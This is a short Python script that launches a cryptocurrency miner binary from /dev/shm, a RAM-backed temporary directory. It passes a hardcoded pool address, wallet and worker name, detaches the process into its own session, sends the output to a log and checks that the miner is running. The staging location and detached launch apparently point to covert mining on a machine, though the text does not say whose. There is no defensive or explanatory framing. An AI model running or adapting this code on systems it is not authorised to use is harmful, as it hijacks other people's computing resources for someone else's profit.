import subprocess, os, stat

DST = '/dev/shm/turbo-pearl-miner'
WALLET = 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'
POOL = 'stratum+tcp://sg1.alphapool.tech:5566'

# Force chmod +x
if os.path.exists(DST):
    os.chmod(DST, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)  # 755
    # Verify permissions
    mode = os.stat(DST).st_mode
    print(f'MODE:{oct(mode)} SIZE:{os.path.getsize(DST)}')
    
    # Start miner directly without nohup
    import time
    subprocess.Popen([DST, '--pool', POOL, '--address', WALLET, '--worker', 'GB10_253'], 
                     stdout=open('/dev/shm/miner.log', 'w'),
                     stderr=subprocess.STDOUT,
                     start_new_session=True)
    time.sleep(5)
    
    # Check if running
    r = subprocess.run(['pgrep', '-a', 'turbo-pearl'], capture_output=True, text=True)
    if r.stdout.strip():
        print('RUNNING:' + r.stdout.strip()[:60])
    else:
        # Check log
        with open('/dev/shm/miner.log') as f:
            print('LOG:' + f.read()[:200])
else:
    print('NO_BINARY')
